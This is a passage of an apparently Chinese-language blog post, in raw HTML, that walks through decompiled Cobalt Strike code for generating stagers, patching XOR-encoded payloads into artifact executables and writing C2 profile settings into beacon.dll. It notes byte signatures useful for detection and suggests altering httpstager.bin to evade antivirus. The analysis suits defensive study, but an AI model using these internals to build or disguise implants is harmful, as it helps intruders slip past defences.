boolean var3 &#x3D; DialogUtils.bool(this.options, &quot;x64&quot;);</span><br><span class="line">      String var4 &#x3D; DialogUtils.string(this.options, &quot;listener&quot;);</span><br><span class="line">      if (var2.equals(&quot;C&quot;)) &#123;</span><br><span class="line">          this.stager &#x3D; Transforms.toC(this.stager);</span><br><span class="line">      &#125; else if (var2.equals(&quot;C#&quot;)) &#123;</span><br><span class="line">          this.stager &#x3D; Transforms.toCSharp(this.stager);</span><br><span class="line">      &#125; else if (var2.equals(&quot;Java&quot;)) &#123;</span><br><span class="line">          this.stager &#x3D; Transforms.toJava(this.stager);</span><br><span class="line">      &#125; else if (var2.equals(&quot;Perl&quot;)) &#123;</span><br><span class="line">          this.stager &#x3D; Transforms.toPerl(this.stager);</span><br><span class="line">      &#125; else if (var2.equals(&quot;PowerShell&quot;) &amp;&amp; var3) &#123;</span><br><span class="line">          this.stager &#x3D; (new ResourceUtils(this.client)).buildPowerShell(this.stager, true);</span><br><span class="line">      &#125; else if (var2.equals(&quot;PowerShell&quot;) &amp;&amp; !var3) &#123;</span><br><span class="line">          this.stager &#x3D; (new ResourceUtils(this.client)).buildPowerShell(this.stager);</span><br><span class="line">      &#125; else if (var2.equals(&quot;PowerShell Command&quot;) &amp;&amp; var3) &#123;</span><br><span class="line">          this.stager &#x3D; (new PowerShellUtils(this.client)).buildPowerShellCommand(this.stager, true);</span><br><span class="line">      &#125; else if (var2.equals(&quot;PowerShell Command&quot;) &amp;&amp; !var3) &#123;</span><br><span class="line">          this.stager &#x3D; (new PowerShellUtils(this.client)).buildPowerShellCommand(this.stager, false);</span><br><span class="line">      &#125; else if (var2.equals(&quot;Python&quot;)) &#123;</span><br><span class="line">          this.stager &#x3D; Transforms.toPython(this.stager);</span><br><span class="line">      &#125; else if (!var2.equals(&quot;Raw&quot;)) &#123;</span><br><span class="line">          if (var2.equals(&quot;Ruby&quot;)) &#123;</span><br><span class="line">              this.stager &#x3D; Transforms.toPython(this.stager);</span><br><span class="line">          &#125; else if (var2.equals(&quot;COM Scriptlet&quot;)) &#123;</span><br><span class="line">              if (var3) &#123;</span><br><span class="line">                  DialogUtils.showError(var2 + &quot; is not compatible with x64 stagers&quot;);</span><br><span class="line">                  return;</span><br><span class="line">              &#125;</span><br><span class="line"></span><br><span class="line">              this.stager &#x3D; (new ArtifactUtils(this.client)).buildSCT(this.stager);</span><br><span class="line">          &#125; else if (var2.equals(&quot;Veil&quot;)) &#123;</span><br><span class="line">              this.stager &#x3D; Transforms.toVeil(this.stager);</span><br><span class="line">          &#125; else if (var2.equals(&quot;VBA&quot;)) &#123;</span><br><span class="line">              this.stager &#x3D; CommonUtils.toBytes(&quot;myArray &#x3D; &quot; + Transforms.toVBA(this.stager));</span><br><span class="line">          &#125;</span><br><span class="line">      &#125;</span><br><span class="line"></span><br><span class="line">      CommonUtils.writeToFile(new File(var1), this.stager);</span><br><span class="line">      DialogUtils.showInfo(&quot;Saved &quot; + var2 + &quot; to\n&quot; + var1);</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure>

<p>​        我们以C#为例来进行分析，主要代码如下</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">if (var2.equals(&quot;C#&quot;)) &#123;</span><br><span class="line">            this.stager &#x3D; Transforms.toCSharp(this.stager);</span><br></pre></td></tr></table></figure>

<p>​        跟进toCSharp方法，创建了一个Packer对象，添加了stager长度的字符串，再添加了stager字节数组的字符串。</p>
<p><img src="/2020/08/31/%E5%85%B3%E4%BA%8ECobaltStrike%E7%94%9F%E6%88%90shell%E7%9A%84%E8%BF%87%E7%A8%8B%E5%92%8C%E6%89%A7%E8%A1%8C%E6%B5%81%E7%A8%8B%E7%9A%84%E5%88%86%E6%9E%90%E5%AD%A6%E4%B9%A0/image-20200901115643729.png" alt="image-20200901115643729"></p>
<p>​        最后再将生成的shellcode写入文件。</p>
<p><img src="/2020/08/31/%E5%85%B3%E4%BA%8ECobaltStrike%E7%94%9F%E6%88%90shell%E7%9A%84%E8%BF%87%E7%A8%8B%E5%92%8C%E6%89%A7%E8%A1%8C%E6%B5%81%E7%A8%8B%E7%9A%84%E5%88%86%E6%9E%90%E5%AD%A6%E4%B9%A0/image-20200901115942287.png" alt="image-20200901115942287"></p>
<p>​        好了，关于payload generator的过程就分析到这里，可能由于个人水平有限，在静态代码分析的功底有限，有些地方可能分析的不对，不过这里大致的流程分析是没有问题的。主要是在stager生成这里，将httpstager.bin模板里的关于监听主机和端口以及uri的位置进行了替换和修改，然后根据不同的类型写入文件。所以如果要免杀，其实有一个思路也是可以将这个httpstager.bin的内容分析出来，将有特征的部分进行更改。</p>
<h3 id="windows-executable"><a href="#windows-executable" class="headerlink" title="windows executable"></a>windows executable</h3><p>​        windows executable是在WindowsExecutableDialog.class中进行处理的，其中关于stager生成的部分和payload generator相同，就不分析了，再看下dialogResult方法，先看下windows exe是怎么处理的，这里主要是调用了patchArtifact方法来进行处理，我们看下这个方法是做什么的。</p>
<p><img src="/2020/08/31/%E5%85%B3%E4%BA%8ECobaltStrike%E7%94%9F%E6%88%90shell%E7%9A%84%E8%BF%87%E7%A8%8B%E5%92%8C%E6%89%A7%E8%A1%8C%E6%B5%81%E7%A8%8B%E7%9A%84%E5%88%86%E6%9E%90%E5%AD%A6%E4%B9%A0/image-20200901133939693.png" alt="image-20200901133939693"></p>
<p>​        跟进patchArtifact，发现内部还调用了patchArtifact方法</p>
<p><img src="/2020/08/31/%E5%85%B3%E4%BA%8ECobaltStrike%E7%94%9F%E6%88%90shell%E7%9A%84%E8%BF%87%E7%A8%8B%E5%92%8C%E6%89%A7%E8%A1%8C%E6%B5%81%E7%A8%8B%E7%9A%84%E5%88%86%E6%9E%90%E5%AD%A6%E4%B9%A0/image-20200901134326360.png" alt="image-20200901134326360"></p>
<p>​        继续跟进</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">public byte[] patchArtifact(byte[] var1, String var2) &#123;</span><br><span class="line">    Stack var3 &#x3D; new Stack();</span><br><span class="line">    var3.push(SleepUtils.getScalar(var1));</span><br><span class="line">    var3.push(SleepUtils.getScalar(var2));</span><br><span class="line">    String var4 &#x3D; this.client.getScriptEngine().format(&quot;EXECUTABLE_ARTIFACT_GENERATOR&quot;, var3);</span><br><span class="line">    return var4 &#x3D;&#x3D; null ? this.fixChecksum(this._patchArtifact(var1, var2)) : this.fixChecksum(CommonUtils.toBytes(var4));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>​        主要看下_patchArtifact的代码</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line">public byte[] _patchArtifact(byte[] var1, String var2) &#123;</span><br><span class="line">    try &#123;</span><br><span class="line">        InputStream var3 &#x3D; CommonUtils.resource(&quot;resources&#x2F;&quot; + var2); &#x2F;&#x2F;我这里var2是artifact64.exe，所以这里加载的是resources&#x2F;artifact64.exe</span><br><span class="line">        byte[] var4 &#x3D; CommonUtils.readAll(var3); &#x2F;&#x2F;读取artifact64.exe的内容</span><br><span class="line">        var3.close();</span><br><span class="line">        byte[] var5 &#x3D; new byte[]&#123;(byte)CommonUtils.rand(254), (byte)CommonUtils.rand(254), (byte)CommonUtils.rand(254), (byte)CommonUtils.rand(254)&#125;;</span><br><span class="line">        byte[] var6 &#x3D; new byte[var1.length];</span><br><span class="line"></span><br><span class="line">        for(int var7 &#x3D; 0; var7 &lt; var1.length; ++var7) &#123;</span><br><span class="line">            var6[var7] &#x3D; (byte)(var1[var7] ^ var5[var7 % 4]);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        String var12 &#x3D; CommonUtils.bString(var4);</span><br><span class="line">        int var8 &#x3D; var12.indexOf(CommonUtils.repeat(&quot;A&quot;, 1024));&#x2F;&#x2F;找到存在1024个A的位置</span><br><span class="line">        Packer var9 &#x3D; new Packer();</span><br><span class="line">        var9.little();</span><br><span class="line">        var9.addInteger(var8 + 16);</span><br><span class="line">        var9.addInteger(var1.length); &#x2F;&#x2F;写入stager的长度</span><br><span class="line">        var9.addString(var5, var5.length); &#x2F;&#x2F; 写入随机字符</span><br><span class="line">        var9.addString(&quot;aaaa&quot;, 4);  </span><br><span class="line">        var9.addString(var6, var6.length); &#x2F;&#x2F;写入stager内容</span><br><span class="line">        if (License.isTrial()) &#123;</span><br><span class="line">            var9.addString(&quot;X5O!P%@AP[4\\PZX54(P^)7CC)7&#125;$EICAR-STANDARD-ANTIVIRUS-TEST-FILE!$H+H*&quot;);</span><br><span class="line">            CommonUtils.print_trial(&quot;Added EICAR string to &quot; + var2);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        byte[] var10 &#x3D; var9.getBytes();</span><br><span class="line">        var12 &#x3D; CommonUtils.replaceAt(var12, CommonUtils.bString(var10), var8);</span><br><span class="line">        return CommonUtils.toBytes(var12);</span><br><span class="line">    &#125; catch (IOException var11) &#123;</span><br><span class="line">        MudgeSanity.logException(&quot;patchArtifact&quot;, var11, false);</span><br><span class="line">        return new byte[0];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>​        总结一下上面的过程，主要就是将1024个A的地址进行替换，替换为随机字符和stager。        </p>
<p>​        用010 editor打开artifact64.exe文件，发现确实是有很多A</p>
<p><img src="/2020/08/31/%E5%85%B3%E4%BA%8ECobaltStrike%E7%94%9F%E6%88%90shell%E7%9A%84%E8%BF%87%E7%A8%8B%E5%92%8C%E6%89%A7%E8%A1%8C%E6%B5%81%E7%A8%8B%E7%9A%84%E5%88%86%E6%9E%90%E5%AD%A6%E4%B9%A0/image-20200901140702963.png" alt="image-20200901140702963"></p>
<p>​        我们再尝试生成一个x64的exe，用010 editor再看看里面的内容，我们可以看到在某处的开头是有aaaa，并且在最后还有一些大写的A,所以这两个点都可以当作CobaltStrike默认生成的exe的特征。</p>
<p><img src="/2020/08/31/%E5%85%B3%E4%BA%8ECobaltStrike%E7%94%9F%E6%88%90shell%E7%9A%84%E8%BF%87%E7%A8%8B%E5%92%8C%E6%89%A7%E8%A1%8C%E6%B5%81%E7%A8%8B%E7%9A%84%E5%88%86%E6%9E%90%E5%AD%A6%E4%B9%A0/image-20200901142122258.png" alt="image-20200901142122258"></p>
<p><img src="/2020/08/31/%E5%85%B3%E4%BA%8ECobaltStrike%E7%94%9F%E6%88%90shell%E7%9A%84%E8%BF%87%E7%A8%8B%E5%92%8C%E6%89%A7%E8%A1%8C%E6%B5%81%E7%A8%8B%E7%9A%84%E5%88%86%E6%9E%90%E5%AD%A6%E4%B9%A0/image-20200901142214196.png" alt="image-20200901142214196"></p>
<p>​        我再看了下dll和service类型的生成方式，发现最终都调用了_patchArtifact方法，因此他们这些模板文件中也都包含了1024个A，并且在替换的过程中首先也会写入四个a,我们以dll为例再看看。</p>
<p><img src="/2020/08/31/%E5%85%B3%E4%BA%8ECobaltStrike%E7%94%9F%E6%88%90shell%E7%9A%84%E8%BF%87%E7%A8%8B%E5%92%8C%E6%89%A7%E8%A1%8C%E6%B5%81%E7%A8%8B%E7%9A%84%E5%88%86%E6%9E%90%E5%AD%A6%E4%B9%A0/image-20200901143237412.png" alt="image-20200901143237412"></p>
<p><img src="/2020/08/31/%E5%85%B3%E4%BA%8ECobaltStrike%E7%94%9F%E6%88%90shell%E7%9A%84%E8%BF%87%E7%A8%8B%E5%92%8C%E6%89%A7%E8%A1%8C%E6%B5%81%E7%A8%8B%E7%9A%84%E5%88%86%E6%9E%90%E5%AD%A6%E4%B9%A0/image-20200901143245238.png" alt="image-20200901143245238"></p>
<p>​        那我们猜想一下，关于这个特征查杀是也可以根据首先出现4个a，在1024个字符以内，又同时出现10个A来进行检测呢？</p>
<h3 id="windows-executables"><a href="#windows-executables" class="headerlink" title="windows executables"></a>windows executables</h3><p>​        还有一种形式，我们在使用privote生成shellcode常用到，那就是windows executables生成的是stagerless类型，这种形式的生成是在WindowsExecutableStageDialog.class文件中</p>
<p>​        首先看下dialogAction中的代码，我们可以看到和payload generator和windows executable的形式不同，executables中并没有在这个方法中生成stager。</p>
<p><img src="/2020/08/31/%E5%85%B3%E4%BA%8ECobaltStrike%E7%94%9F%E6%88%90shell%E7%9A%84%E8%BF%87%E7%A8%8B%E5%92%8C%E6%89%A7%E8%A1%8C%E6%B5%81%E7%A8%8B%E7%9A%84%E5%88%86%E6%9E%90%E5%AD%A6%E4%B9%A0/image-20200901144358493.png" alt="image-20200901144358493"></p>
<p>​        再看下dialogResult方法,和其他的方式不同，它也获取了SCListener，并通过调用export方法</p>
<p><img src="/2020/08/31/%E5%85%B3%E4%BA%8ECobaltStrike%E7%94%9F%E6%88%90shell%E7%9A%84%E8%BF%87%E7%A8%8B%E5%92%8C%E6%89%A7%E8%A1%8C%E6%B5%81%E7%A8%8B%E7%9A%84%E5%88%86%E6%9E%90%E5%AD%A6%E4%B9%A0/image-20200901144705204.png" alt="image-20200901144705204"></p>
<p>​        我们跟进export方法，export的代码如下，他根据payload的类型，调用了不同的方法，我们以最基本的http_reverse为例进行分析</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">public byte[] export(String var1, int var2) &#123;</span><br><span class="line">    if (&quot;windows&#x2F;foreign&#x2F;reverse_http&quot;.equals(this.getPayload())) &#123;</span><br><span class="line">        return this.getPayloadStager(var1);</span><br><span class="line">    &#125; else if (&quot;windows&#x2F;foreign&#x2F;reverse_https&quot;.equals(this.getPayload())) &#123;</span><br><span class="line">        return this.getPayloadStager(var1);</span><br><span class="line">    &#125; else if (&quot;windows&#x2F;beacon_http&#x2F;reverse_http&quot;.equals(this.getPayload())) &#123;</span><br><span class="line">        return (new BeaconPayload(this, var2)).exportBeaconStageHTTP(this.getPort(), this.getCallbackHosts(), false, false, var1);</span><br><span class="line">    &#125; else if (&quot;windows&#x2F;beacon_https&#x2F;reverse_https&quot;.equals(this.getPayload())) &#123;</span><br><span class="line">        return (new BeaconPayload(this, var2)).exportBeaconStageHTTP(this.getPort(), this.getCallbackHosts(), false, true, var1);</span><br><span class="line">    &#125; else if (&quot;windows&#x2F;beacon_dns&#x2F;reverse_dns_txt&quot;.equals(this.getPayload())) &#123;</span><br><span class="line">        return (new BeaconPayload(this, var2)).exportBeaconStageDNS(this.getPort(), this.getCallbackHosts(), true, false, var1);</span><br><span class="line">    &#125; else if (&quot;windows&#x2F;beacon_bind_pipe&quot;.equals(this.getPayload())) &#123;</span><br><span class="line">        return (new BeaconPayload(this, var2)).exportSMBStage(var1);</span><br><span class="line">    &#125; else if (&quot;windows&#x2F;beacon_bind_tcp&quot;.equals(this.getPayload())) &#123;</span><br><span class="line">        return (new BeaconPayload(this, var2)).exportBindTCPStage(var1);</span><br><span class="line">    &#125; else if (&quot;windows&#x2F;beacon_reverse_tcp&quot;.equals(this.getPayload())) &#123;</span><br><span class="line">        return (new BeaconPayload(this, var2)).exportReverseTCPStage(var1);</span><br><span class="line">    &#125; else &#123;</span><br><span class="line">        AssertUtils.TestFail(&quot;Unknown payload &#39;&quot; + this.getPayload() + &quot;&#39;&quot;);</span><br><span class="line">        return new byte[0];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>​        我们发现其调用了exportBeaconStageHTTP方法，跟进这个方法，首先判断架构，再根据架构的不同给var6进行赋值，最后调用了exportBeaconStage方法</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">public byte[] exportBeaconStageHTTP(int var1, String var2, boolean var3, boolean var4, String var5) &#123;</span><br><span class="line">    AssertUtils.TestSetValue(var5, &quot;x86, x64&quot;);</span><br><span class="line">    String var6 &#x3D; &quot;&quot;;</span><br><span class="line">    if (&quot;x86&quot;.equals(var5)) &#123;</span><br><span class="line">        var6 &#x3D; &quot;resources&#x2F;beacon.dll&quot;;</span><br><span class="line">    &#125; else if (&quot;x64&quot;.equals(var5)) &#123;</span><br><span class="line">        var6 &#x3D; &quot;resources&#x2F;beacon.x64.dll&quot;;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    return this.pe.process(this.exportBeaconStage(var1, var2, var3, var4, var6), var5);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>​        跟进exportBeaconStage方法，这个方法比较长，我会把简单的分析写在注释中</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br></pre></td><td class="code"><pre><span class="line">protected byte[] exportBeaconStage(int var1, String var2, boolean var3, boolean var4, String var5) &#123;</span><br><span class="line">    try &#123;</span><br><span class="line">        long var6 &#x3D; System.currentTimeMillis();</span><br><span class="line">        byte[] var8 &#x3D; SleevedResource.readResource(var5); &#x2F;&#x2F;获取sleeve&#x2F;beacon.dll的内容</span><br><span class="line">        if (var2.length() &gt; 254) &#123;</span><br><span class="line">            var2 &#x3D; var2.substring(0, 254);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        String[] var9 &#x3D; this.c2profile.getString(&quot;.http-get.uri&quot;).split(&quot; &quot;); &#x2F;&#x2F;加载配置文件中.http-get.uri的值</span><br><span class="line">        String[] var10 &#x3D; var2.split(&quot;,\\s*&quot;);</span><br><span class="line">        LinkedList var11 &#x3D; new LinkedList();</span><br><span class="line"></span><br><span class="line">        for(int var12 &#x3D; 0; var12 &lt; var10.length; ++var12) &#123;</span><br><span class="line">            var11.add(var10[var12]);</span><br><span class="line">            var11.add(CommonUtils.pick(var9));</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        String var32;</span><br><span class="line">        while(var11.size() &gt; 2 &amp;&amp; CommonUtils.join(var11, &quot;,&quot;).length() &gt; 255) &#123;</span><br><span class="line">            var32 &#x3D; var11.removeLast() + &quot;&quot;;</span><br><span class="line">            String var13 &#x3D; var11.removeLast() + &quot;&quot;;</span><br><span class="line">            CommonUtils.print_info(&quot;dropping &quot; + var13 + var32 + &quot; from Beacon profile for size&quot;);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        var32 &#x3D; randua(this.c2profile);</span><br><span class="line">        int var33 &#x3D; Integer.parseInt(this.c2profile.getString(&quot;.sleeptime&quot;)); &#x2F;&#x2F;加载配置文件的sleeptime的值</span><br><span class="line">        String var14 &#x3D; CommonUtils.pick(this.c2profile.getString(&quot;.http-post.uri&quot;).split(&quot; &quot;));</span><br><span class="line">        byte[] var15 &#x3D; this.c2profile.recover_binary(&quot;.http-get.server.output&quot;);</span><br><span class="line">        byte[] var16 &#x3D; this.c2profile.apply_binary(&quot;.http-get.client&quot;);</span><br><span class="line">        byte[] var17 &#x3D; this.c2profile.apply_binary(&quot;.http-post.client&quot;);</span><br><span class="line">        int var18 &#x3D; this.c2profile.size(&quot;.http-get.server.output&quot;, 1048576);</span><br><span class="line">        int var19 &#x3D; Integer.parseInt(this.c2profile.getString(&quot;.jitter&quot;));</span><br><span class="line">        if (var19 &lt; 0 || var19 &gt; 99) &#123;</span><br><span class="line">            var19 &#x3D; 0;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        int var20 &#x3D; Integer.parseInt(this.c2profile.getString(&quot;.maxdns&quot;));</span><br><span class="line">        if (var20 &lt; 0 || var20 &gt; 255) &#123;</span><br><span class="line">            var20 &#x3D; 255;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        int var21 &#x3D; 0;</span><br><span class="line">        if (var3) &#123;</span><br><span class="line">            var21 |&#x3D; 1;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        if (var4) &#123;</span><br><span class="line">            var21 |&#x3D; 8;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        long var22 &#x3D; CommonUtils.ipToLong(this.c2profile.getString(&quot;.dns_idle&quot;));</span><br><span class="line">        int var24 &#x3D; Integer.parseInt(this.c2profile.getString(&quot;.dns_sleep&quot;));</span><br><span class="line">        Settings var25 &#x3D; new Settings();</span><br><span class="line">        var25.addShort(1, var21);</span><br><span class="line">        var25.addShort(2, var1);</span><br><span class="line">        var25.addInt(3, var33);</span><br><span class="line">        var25.addInt(4, var18);</span><br><span class="line">        var25.addShort(5, var19);</span><br><span class="line">        var25.addShort(6, var20);</span><br><span class="line">        var25.addData(7, this.publickey, 256);</span><br><span class="line">        var25.addString(8, CommonUtils.join(var11, &quot;,&quot;), 256);</span><br><span class="line">        var25.addString(9, var32, 128);</span><br><span class="line">        var25.addString(10, var14, 64);</span><br><span class="line">        var25.addData(11, var15, 256);</span><br><span class="line">        var25.addData(12, var16, 256);</span><br><span class="line">        var25.addData(13, var17, 256);</span><br><span class="line">        var25.addData(14, CommonUtils.asBinary(this.c2profile.getString(&quot;.spawnto&quot;)), 16);</span><br><span class="line">        var25.addString(29, this.c2profile.getString(&quot;.post-ex.spawnto_x86&quot;), 64);</span><br><span class="line">        var25.addString(30, this.c2profile.getString(&quot;.post-ex.spawnto_x64&quot;), 64);</span><br><span class="line">        var25.addString(15, &quot;&quot;, 128);</span><br><span class="line">        var25.addShort(31, QuickSecurity.getCryptoScheme());</span><br><span class="line">        var25.addInt(19, (int)var22);</span><br><span class="line">        var25.addInt(20, var24);</span><br><span class="line">        var25.addString(26, this.c2profile.getString(&quot;.http-get.verb&quot;), 16);</span><br><span class="line">        var25.addString(27, this.c2profile.getString(&quot;.http-post.verb&quot;), 16);</span><br><span class="line">        var25.addInt(28, this.c2profile.shouldChunkPosts() ? 96 : 0);</span><br><span class="line">        var25.addInt(37, this.c2profile.getInt(&quot;.watermark&quot;));</span><br><span class="line">        var25.addShort(38, this.c2profile.option(&quot;.stage.cleanup&quot;) ? 1 : 0);</span><br><span class="line">        var25.addShort(39, this.c2profile.exerciseCFGCaution() ? 1 : 0);</span><br><span class="line">        String var26 &#x3D; this.listener.getHostHeader();</span><br><span class="line">        if (var26 !&#x3D; null &amp;&amp; var26.length() !&#x3D; 0) &#123;</span><br><span class="line">            if (Profile.usesHostBeacon(this.c2profile)) &#123;</span><br><span class="line">                var25.addString(54, &quot;&quot;, 128); &#x2F;&#x2F;获取host的值进行赋值</span><br><span class="line">            &#125; else &#123;</span><br><span class="line">                var25.addString(54, &quot;Host: &quot; + this.listener.getHostHeader() + &quot;\r\n&quot;, 128);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; else &#123;</span><br><span class="line">            var25.addString(54, &quot;&quot;, 128);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        if (Profile.usesCookieBeacon(this.c2profile)) &#123;</span><br><span class="line">            var25.addShort(50, 1);</span><br><span class="line">        &#125; else &#123;</span><br><span class="line">            var25.addShort(50, 0);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        ProxyServer var27 &#x3D; ProxyServer.parse(this.listener.getProxyString());</span><br><span class="line">        var27.setup(var25);</span><br><span class="line">        this.setupKillDate(var25);</span><br><span class="line">        this.setupGargle(var25, var5);</span><br><span class="line">        (new ProcessInject(this.c2profile)).apply(var25);</span><br><span class="line">        byte[] var28 &#x3D; var25.toPatch();</span><br><span class="line">        var28 &#x3D; beacon_obfuscate(var28);</span><br><span class="line">        String var29 &#x3D; CommonUtils.bString(var8);</span><br><span class="line">        int var30 &#x3D; var29.indexOf(&quot;AAAABBBBCCCCDDDDEEEEFFFF&quot;); &#x2F;&#x2F;找到AAAABBBBCCCCDDDDEEEEFFFF的位置</span><br><span class="line">        var29 &#x3D; CommonUtils.replaceAt(var29, CommonUtils.bString(var28), var30); &#x2F;&#x2F;将模板的内容进行替换</span><br><span class="line">        return CommonUtils.toBytes(var29); &#x2F;&#x2F;返回替换后的结果</span><br><span class="line">    &#125; catch (IOException var31) &#123;</span><br><span class="line">        MudgeSanity.logException(&quot;export Beacon stage: &quot; + var5, var31, false);</span><br><span class="line">        return new byte[0];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>​        简单的分析后我们发现这段代码的主要作用是读取beacon.dll文件，以这个文件作为模板对一些值进行替换，并且是以找到AAAABBBBCCCCDDDDEEEEFFFF来找到要替换的位置的，但是比较奇怪的是我再beacon.dll中并没有发现AAAABBBBCCCCDDDDEEEEFFFF这个字符串。</p>
<p><img src="/2020/08/31/%E5%85%B3%E4%BA%8ECobaltStrike%E7%94%9F%E6%88%90shell%E7%9A%84%E8%BF%87%E7%A8%8B%E5%92%8C%E6%89%A7%E8%A1%8C%E6%B5%81%E7%A8%8B%E7%9A%84%E5%88%86%E6%9E%90%E5%AD%A6%E4%B9%A0/image-20200901154145081.png" alt="image-20200901154145081"></p>
<p>​        后面根据不同的类型的类型，调用patchArtifact方法，虽然使用的模板不同，最终还是会有4个a的特征，不过可能使用这种方式的模板比较大，因此不会有大写A这种特征。因为本身替代Stager那部分比如beacon.dll的文件内容就比较大，有200多k。</p>
<p><img src="/2020/08/31/%E5%85%B3%E4%BA%8ECobaltStrike%E7%94%9F%E6%88%90shell%E7%9A%84%E8%BF%87%E7%A8%8B%E5%92%8C%E6%89%A7%E8%A1%8C%E6%B5%81%E7%A8%8B%E7%9A%84%E5%88%86%E6%9E%90%E5%AD%A6%E4%B9%A0/image-20200901154601816.png" alt="image-20200901154601816"></p>
<h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><p>​        总结一下这几种生成方式的过程和一些区别</p>
<ul>
<li>payload generator只是加载stager模板并且对里面host，port和uri部分进行替换，最终生成的文件只是将stager文件以字节数组的形式进行输出</li>
